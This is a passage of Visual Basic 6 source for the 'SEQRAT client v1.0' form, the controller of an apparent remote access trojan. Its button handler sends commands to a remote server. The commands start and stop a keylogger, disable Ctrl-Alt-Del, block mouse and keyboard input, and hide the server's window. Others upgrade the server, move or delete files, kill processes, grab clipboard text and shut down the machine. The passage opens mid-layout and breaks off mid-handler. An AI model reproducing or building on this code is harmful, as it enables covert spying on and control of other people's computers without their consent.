         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   51
         Left            =   240
         TabIndex        =   135
         Top             =   120
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "block mouse and keyboard input"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   52
         Left            =   3840
         TabIndex        =   136
         Top             =   480
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "get mouse position"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   53
         Left            =   240
         TabIndex        =   137
         Top             =   1440
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show mouse cursor"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   57
         Left            =   3840
         TabIndex        =   141
         Top             =   1680
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "set mouse position to above coord"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   54
         Left            =   240
         TabIndex        =   142
         Top             =   2040
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "swap mouse buttons"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "Y :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   15
         Left            =   5640
         TabIndex        =   140
         Top             =   1080
         Width           =   255
      End
      Begin VB.Label Label16 
         BackColor       =   &H00000000&
         Caption         =   "X :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   14
         Left            =   4080
         TabIndex        =   139
         Top             =   1080
         Width           =   255
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   11
      Left            =   840
      TabIndex        =   171
      Top             =   3600
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text17 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   1815
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   174
         Top             =   240
         Width           =   6855
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   65
         Left            =   120
         TabIndex        =   172
         Top             =   2160
         Width           =   2175
         _ExtentX        =   3836
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "get clipboard text"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   66
         Left            =   2520
         TabIndex        =   173
         Top             =   2160
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "clear clipboard"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   67
         Left            =   4800
         TabIndex        =   175
         Top             =   2160
         Width           =   2175
         _ExtentX        =   3836
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "set clipboard text"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   3
      Left            =   240
      TabIndex        =   106
      Top             =   3360
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text10 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3720
         TabIndex        =   110
         Text            =   "5"
         Top             =   1080
         Width           =   735
      End
      Begin VB.TextBox Text9 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   1920
         TabIndex        =   109
         Text            =   "0"
         Top             =   1080
         Width           =   735
      End
      Begin VB.CheckBox Check3 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "Ping server at the specified interval below"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1920
         TabIndex        =   108
         Top             =   600
         Width           =   3255
      End
      Begin VB.CheckBox Check2 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "Don't show PING - PONG messages"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1920
         TabIndex        =   107
         Top             =   240
         Width           =   3255
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   21
         Left            =   1920
         TabIndex        =   113
         Top             =   1680
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "ping server now !"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Label Label21 
         BackColor       =   &H00000000&
         Caption         =   "second(s)"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   4440
         TabIndex        =   112
         Top             =   1080
         Width           =   735
      End
      Begin VB.Label Label15 
         BackColor       =   &H00000000&
         Caption         =   "minute(s)"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2640
         TabIndex        =   111
         Top             =   1080
         Width           =   735
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   9
      Left            =   840
      TabIndex        =   158
      Top             =   3120
      Visible         =   0   'False
      Width           =   7185
      Begin MSComctlLib.ListView lstProc 
         Height          =   2150
         Left            =   240
         TabIndex        =   161
         Top             =   0
         Width           =   6735
         _ExtentX        =   11880
         _ExtentY        =   3784
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         ForeColor       =   16776960
         BackColor       =   4924675
         Appearance      =   0
         NumItems        =   5
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "PID"
            Object.Width           =   1058
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "PPID"
            Object.Width           =   1058
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "exename"
            Object.Width           =   6174
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "priority"
            Object.Width           =   1587
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Text            =   "threads"
            Object.Width           =   1587
         EndProperty
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   58
         Left            =   1440
         TabIndex        =   159
         Top             =   2160
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "refresh list"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   25
         Left            =   3720
         TabIndex        =   160
         Top             =   2160
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "kill selected process"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Label Label24 
      BackStyle       =   0  'Transparent
      Caption         =   "SEQRAT client v1.0"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   9
         Charset         =   255
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFC0&
      Height          =   255
      Left            =   120
      TabIndex        =   279
      Top             =   60
      Width           =   2295
   End
   Begin VB.Line Line1 
      X1              =   1400
      X2              =   1400
      Y1              =   340
      Y2              =   680
   End
   Begin VB.Label Label7 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "connection:"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   100
      TabIndex        =   53
      Top             =   360
      Width           =   975
   End
   Begin VB.Shape Shape9 
      BorderColor     =   &H00FF8080&
      Height          =   285
      Left            =   45
      Top             =   7020
      Width           =   8620
   End
   Begin VB.Shape shpLight 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      Height          =   260
      Left            =   1100
      Shape           =   3  'Circle
      Top             =   380
      Width           =   285
   End
   Begin VB.Label Label6 
      Appearance      =   0  'Flat
      BackColor       =   &H0091450D&
      Caption         =   "Current connection status :"
      ForeColor       =   &H00FFFFFF&
      Height          =   180
      Left            =   120
      TabIndex        =   51
      Top             =   7080
      Width           =   1935
   End
   Begin VB.Shape Shape6 
      FillStyle       =   0  'Solid
      Height          =   305
      Left            =   6330
      Top             =   355
      Width           =   2250
   End
   Begin VB.Label Label4 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "password :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   4140
      TabIndex        =   49
      Top             =   360
      Width           =   795
   End
   Begin VB.Shape Shape5 
      BorderColor     =   &H00FF8080&
      Height          =   255
      Left            =   75
      Top             =   6630
      Width           =   1425
   End
   Begin VB.Shape Shape4 
      BorderColor     =   &H00FF8080&
      Height          =   3300
      Left            =   1440
      Top             =   3270
      Width           =   7215
   End
   Begin VB.Shape Shape3 
      BorderColor     =   &H00FF8080&
      Height          =   2535
      Left            =   1440
      Top             =   700
      Width           =   7215
   End
   Begin VB.Label Label2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "raw command :"
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   240
      TabIndex        =   44
      Top             =   6615
      Width           =   1215
   End
   Begin VB.Line Line2 
      X1              =   6280
      X2              =   6280
      Y1              =   315
      Y2              =   715
   End
   Begin VB.Label lblStart 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "             not connected"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   6330
      TabIndex        =   12
      Top             =   7050
      Width           =   2310
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "IP :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   1440
      TabIndex        =   41
      Top             =   360
      Width           =   375
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   " x"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   8280
      TabIndex        =   40
      Top             =   45
      Width           =   255
   End
   Begin VB.Label Label5 
      Appearance      =   0  'Flat
      BackColor       =   &H00A2470B&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "port :"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   3140
      TabIndex        =   13
      Top             =   360
      Width           =   390
   End
   Begin VB.Shape Shape8 
      BackColor       =   &H00FFFFFF&
      FillColor       =   &H00FF8080&
      FillStyle       =   0  'Solid
      Height          =   360
      Left            =   30
      Top             =   330
      Width           =   8625
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H0091450D&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00000000&
      Height          =   300
      Left            =   30
      Top             =   30
      Width           =   8645
   End
   Begin VB.Label lblStatusBar 
      Appearance      =   0  'Flat
      BackColor       =   &H0091450D&
      Caption         =   "closed"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   2160
      TabIndex        =   14
      Top             =   7080
      Width           =   3855
   End
   Begin VB.Shape Shape2 
      BackColor       =   &H00FFFFFF&
      FillColor       =   &H0091450D&
      FillStyle       =   0  'Solid
      Height          =   285
      Left            =   50
      Shape           =   4  'Rounded Rectangle
      Top             =   7020
      Width           =   8620
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'Copyright (c)2002 - Joaquín Encina
'This program is free software; you can redistribute it and/or
'modify it under the terms of the GNU General Public License
'as published by the Free Software Foundation; either version 2
'of the License, or (at your option) any later version.
'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
'See the GNU General Public License for more details.
'You should have received a copy of the GNU General Public License
'along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

Public oldMin As Byte
Public oldSec As Byte
Public crtMenu As Byte
Public crtBtn As Byte

Private MDForm
Private MDFormX
Private MDFormY

Private Sub btnDisconnect_Click()
On Error Resume Next
    ws.Close
    lblStart.Caption = "  disconnected at " & Format(Now, "HH:mm:ss")
    lblStart.ForeColor = vbWhite
End Sub

Private Sub btnConnect_Click()
On Error Resume Next
Me.MousePointer = vbHourglass
ip = Text3.Text
Timer1.Enabled = True

If ws.State <> sckClosed Then ws.Close
ws.RemoteHost = Text3.Text
ws.RemotePort = Val(Text4.Text)

ws.Connect
start = Timer
Do While ws.State <> 7
    ws.Connect
    If Timer > start + 2 Then
        Me.MousePointer = vbDefault
        status "server connection failed !", False
        Exit Sub
    End If
    DoEvents
Loop
Me.MousePointer = vbDefault
lblStart = "      connected at " & Format(Now, "HH:mm:ss")
lblStart.ForeColor = vbGreen
End Sub

Private Sub Check12_Click()
'listen only ; dont connect to foreign
Text25.Text = "0"
Text26.Text = "0"
End Sub

Private Sub Check13_Click()
If Check13.Value = 0 Then
    Label23.Enabled = False
    Text27.Enabled = False
Else
    Label23.Enabled = True
    Text27.Enabled = True
End If
End Sub

Private Sub Check3_Click()
If Check3.Value = 1 Then
    outPut "PING !", True
    wsSend "pi"
    tmrPing.Enabled = True
    oldMin = Minute(Now)
    oldSec = Second(Now)
Else
    tmrPing.Enabled = False
End If
End Sub





Private Sub FlatBttn1_Click()
    Text1.Text = ""
End Sub

Private Sub FlatBttn2_Click()
If Text1.Top = 3280 Then
    If Frama(18).Height < 2500 Then
        Text1.ZOrder
        Text1.Top = 720
        Text1.Left = 40
        Shape4.Top = 710
        Shape4.Left = 30
        Text1.Width = Text1.Width + 1410
        Text1.Height = Text1.Height + 2500
        Shape4.Width = Text1.Width + 30
        Shape4.Height = Text1.Height + 30
        FlatBttn2.Caption = "restore"
    End If
Else
    Text1.Top = 3280
    Text1.Left = 1450
    Shape4.Top = 3270
    Shape4.Left = 1440
    Text1.Width = 7185
    Text1.Height = 3270
    Shape4.Width = Text1.Width + 30
    Shape4.Height = Text1.Height + 30
    FlatBttn2.Caption = "maximize"
End If
End Sub

Private Sub FlatBttn3_Click()
If FlatBttn3.Caption = "maximize" Then
    Frama(18).ZOrder
    Frama(18).Height = 5780
    txtScript.Height = Frama(18).Height - 220
    FlatBttn3.Caption = "restore"
Else
    Frama(18).Height = 2490
    txtScript.Height = Frama(18).Height - 220
    FlatBttn3.Caption = "maximize"
End If
End Sub

Private Sub FlatBttn4_Click()
txtScript.Text = ""
End Sub

Private Sub form_load()
Me.Width = 8700
Me.Height = 7350
For i = 0 To frmMenu.UBound
    frmMenu(i).Left = 75
    frmMenu(i).Top = FlatB(i).Top + 360
Next i
For i = 0 To Frama.UBound
    Frama(i).Top = 720
    Frama(i).Left = 1450
Next i
For i = 0 To lblGetInfo.UBound
    lblGetInfo(i).BackColor = &H4B2503
Next i

Combo4.ListIndex = 1 'run set to normal

End Sub

Private Sub form_unload(cancel As Integer)
On Error Resume Next
    ws.Close
    Unload Me
End Sub











Private Sub Label4_Click()
If Text5.PasswordChar = "" Then
    Text5.PasswordChar = "*"
Else
    Text5.PasswordChar = ""
End If
End Sub

Private Sub Text12_Change()
If Check4.Value = 1 Then Call sendK
End Sub

Private Sub timer1_timer()
On Error Resume Next
    Select Case ws.State
        Case sckClosed: status "closed", False
                Timer1.Enabled = False
        Case sckClosing: status "closing", True
        Case sckConnected: status "connected", True
        Case sckConnecting: status "connecting...", False
        Case sckOpen: status "open", True
        Case sckConnectionPending: status "connection pending", False
        Case sckResolvingHost: status "resolving host", False
        Case sckHostResolved: status "host resolved", False
    End Select
End Sub


Private Sub form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
MDForm = 1
MDFormX = x
MDFormY = y
End Sub
Private Sub form_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
MDForm = 0
End Sub
Private Sub form_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
If MDForm <> 1 Then Exit Sub
Me.Top = (GetY * 15) - MDFormY
Me.Left = (GetX * 15) - MDFormX
End Sub

Private Sub Label3_Click()
    Unload Me
End Sub

Private Sub btnMenu6_Click(Index As Integer)
    
'On Error Resume Next
    
    btnMenu6(crtBtn).TextColor = &HF48C46
    btnMenu6(Index).TextColor = vbWhite
    crtBtn = Index

Select Case Index
    Case 0: showF 0 'about frame
    Case 1: showF 18 'script editor
    Case 2: OpenDoc App.Path & "\readme.txt"
    Case 3: OpenDoc "http://www.planetsourcecode.com/vb/scripts/ShowCode.asp?txtCodeId=39461&lngWId=1" 'vote
    Case 4: 'run executable
            If Text18.Text = "" Then Exit Sub
            wsSend "03" & Text18.Text & Format(Combo4.ListIndex), True
    
    Case 5: Call populateScripts
            showF 17
    Case 6: showF 14
    Case 7: openScript (App.Path & "\scripts\" & lstScripts.SelectedItem.Text & ".script")
            showF 18
    Case 8:
            wsSend "6800", True
            showF 15
    Case 9: Call saveScript
            
    Case 10: showF 16
    Case 11: showF 1
    Case 12: showF 3
    Case 13:    'ping host
            DoEvents
            lblWait.Visible = True
            DoEvents
            tmpcmd = IIf(Check1.Value = 1, Environ("COMSPEC") & " /c ping -a ", Environ("COMSPEC") & " /c ping ")
            Text1.Text = Text1.Text & vbCrLf & _
            ExecuteCommand(tmpcmd & " -n " & Text7.Text & " -l " & Text8.Text & " " & Text6.Text) & vbCrLf
            lblWait.Visible = False
    
    Case 14: showF 2    'get info
             wsSend "15"
    Case 15: 'show server GUI
            wsSend "0b"
    Case 16: rasp = MsgBox("if you reset remote script control then all code and objects added to script control will be discarded (including the application's one)", vbYesNo + vbExclamation, "are you sure ?")
             If rasp = vbYes Then wsSend "97" 'reset scriptcontrol
    
    Case 17: 'hide server GUI
            wsSend "0a"
    Case 18: showF 4
    Case 19: 'stop listening
            wsSend "0c"
    Case 20: 'change listening port
            wsSend "0d" & Text28.Text, True
    Case 21:
            If Check2.Value = 0 Then outPut "PING !", True
             wsSend "pi"    'ping server
    Case 22: wsSend "xx"    'close server
    Case 23: showF 5
    Case 24: showF 6
    Case 25: 'send the PID to kill process
            If Trim(lstProc.SelectedItem.Text) <> "0" Then
                wsSend "84" & lstProc.SelectedItem.Text, True
            End If
            
    Case 26: showF 7
    Case 27: showF 8
    Case 28: wsSend "12" 'give me windows
    Case 29: showF 9
    Case 30: showF 10
    Case 31: showF 13
    Case 32: showF 12 'give me drives
            wsSend "f0"
            
    Case 33: showF 11
    
    Case 34:    'send windowhandle to activate
            wsSend "32" & lstWind.SelectedItem.Text, True
    
    
    Case 36: 'logoff user
            wsSend "08" & IIf(Check6.Value = 1, "4", "0"), True
    Case 38: 'shutdown pc
            wsSend "08" & IIf(Check6.Value = 1, "5", "1"), True
    Case 77: 'reboot pc
            wsSend "08" & IIf(Check6.Value = 1, "6", "2"), True
            
    Case 39: wsSend "70"    'restart winsock
    Case 37: wsSend "89"    'restart server
    Case 40: Call upgrade   'upgrade server
        
    Case 41: wsSend "71"    'start keylogger
    Case 45: wsSend "72"    'stop keylogger
        
    Case 42: wsSend "88"    'unblock mouse and keys
             wsSend "24"    'enable ctrl-alt-del
    Case 43: wsSend "23"    'disable ctrl-alt-del
             wsSend "87"    'block mouse and keys
                    
    Case 44: Call sendK     'sendkeys
    
    Case 49: wsSend "85"    'hide mose cursor
    Case 50: btnMenu6_Click (42)
    Case 51: btnMenu6_Click (43)
    Case 53: wsSend "86"    'show mouse cursor
    Case 54: wsSend "36"    'swap mouse buttons
    Case 52: wsSend "91"    'get mouse x;y
    
    Case 55: 'matrix start
                If ws.State = sckConnected Then
                    If btnMenu6(55).Caption = "start" Then
                        wsSend "25" & txtMatrix.Text, True
                        btnMenu6(55).Caption = "end"
                        txtMatrix.Locked = True
                        txtChat.Enabled = True
                        txtChat.SetFocus
                    Else
                        wsSend "26" & "cmdCloseX", True
                    End If
                End If
    
    Case 56: 'flash window
                wsSend "33" & lstWind.SelectedItem.Text, True
    
    
    Case 57: wsSend "92" & Trim(Text13.Text) & ";" & Trim(Text14.Text), True 'set mouse x;y
    Case 58:    'give me processes
                wsSend "83"
    
    
    
    Case 59:    'start the live control
                If Val(Text15.Text) < 2 Or Val(Text15.Text) > 20 Or Val(Text16.Text) < 0 Then
                    MsgBox "invalid value" & vbCrLf & "valid values: slices (2 - 20) ; timetowait > 0", vbExclamation
                    Exit Sub
                End If
                strOptSend = Str(Text16.Text) & ";" & Str(Text15.Text) & ";"
                If Option1.Value = True Then strOptSend = strOptSend & "2" & ";"
                If Option2.Value = True Then strOptSend = strOptSend & "16" & ";"
                If Option3.Value = True Then strOptSend = strOptSend & "256" & ";"
                If Check5.Value = 1 Then
                    strOptSend = strOptSend & "d"
                Else
                    strOptSend = strOptSend & "n"
                End If
                frmScreen.Show
     Case 60:  'stop live control
                Unload frmScreen
                
     Case 61: 'hide window
                wsSend "35" & "00" & lstWind.SelectedItem.Text, True
        Case 62: 'show window
                wsSend "35" & "05" & lstWind.SelectedItem.Text, True
        Case 63: 'minimize window
                wsSend "35" & "02" & lstWind.SelectedItem.Text, True
        Case 64: 'maximize window
                wsSend "35" & "03" & lstWind.SelectedItem.Text, True
                
        Case 65: wsSend "93" 'clipboard
        Case 66: wsSend "94"
        Case 67: wsSend "95" & Text17.Text, True
        
        Case 68: wsSend "f1" & Text19.Text, True
        Case 69:
                If Text18.Text = "" Then Exit Sub
                rasp = MsgBox("make directory: " & Text18.Text & " ?", vbYesNo, "mkdir")
                If rasp = vbYes Then wsSend "18" & Text18.Text, True
        Case 70:
                If Text18.Text = "" Then Exit Sub
                If InStr(1, lstFiles.SelectedItem.SubItems(2), "D") = 0 Then Exit Sub
                rasp = MsgBox("remove directory: " & Text18.Text & " ?", vbYesNo, "rmdir")
                wsSend "19" & Text18.Text, True
        Case 71:
                If Text18.Text = "" Then Exit Sub
                rasp = MsgBox("download remote: " & Text18.Text & " ?", vbYesNo, "get file")
                If rasp = vbYes Then wsSend "06" & Text18.Text, True
        Case 72:
                Dim buf As String
                If Text18.Text = "" Then Exit Sub
                cfile = InputBox("enter the path&name of the local file " & vbCrLf & "to upload to remote " & JustPath(Text18.Text), "put file")
                If cfile = "" Or Dir(cfile, 39) = "" Then Exit Sub
                oldir = CurDir()
                ChDrive (cfile)
                ChDir (JustPath(cfile))
                        Open cfile For Binary As 2
                        buf = Space(LOF(2))
                        Get 2, , buf
                        Close 2
                        ws.SendData "07" & JustPath(Text18.Text) & JustName(cfile) & Chr(0) & buf
                        Do While sc = 0
                            DoEvents
                        Loop
                        sc = 0
                ChDrive (oldir)
                ChDir (oldir)
        
        Case 73:    'kill file
                    If Text18.Text = "" Then Exit Sub
                    rasp = MsgBox("kill remote:  " & Text18.Text & "  ?", vbYesNo)
                    If rasp = vbYes Then wsSend "05" & Text18.Text, True
        
        Case 74:    'play or stop wav
                    If btnMenu6(74).Caption = "play wav" Then
                        If Text18.Text = "" Then Exit Sub
                        If LCase$(Right(Text18.Text, 4)) <> ".wav" Then Exit Sub
                        rasp = MsgBox("play to remote:  " & Text18.Text & "  ?", vbYesNo)
                        If rasp = vbYes Then
                            wsSend "301" & Text18.Text, True
                            btnMenu6(74).Caption = "stop play"
                        End If
                    Else
                        wsSend "31"
                        btnMenu6(74).Caption = "play wav"
                    End If
        
                    
        Case 75: 'set a bmp wallpaper
                    If Text18.Text = "" Then Exit Sub
                    If LCase$(Right(Text18.Text, 4)) <> ".bmp" Then Exit Sub
                    rasp = MsgBox("set " & Text18.Text & " to be wallpaper ?", vbYesNo)
                    If rasp = vbYes Then wsSend "37" & Text18.Text, True
                    
        Case 76: 'show image
                    If ws.State = sckConnected Then
                     If btnMenu6(76).Caption = "show image" Then
                        If Text18.Text = "" Then Exit Sub
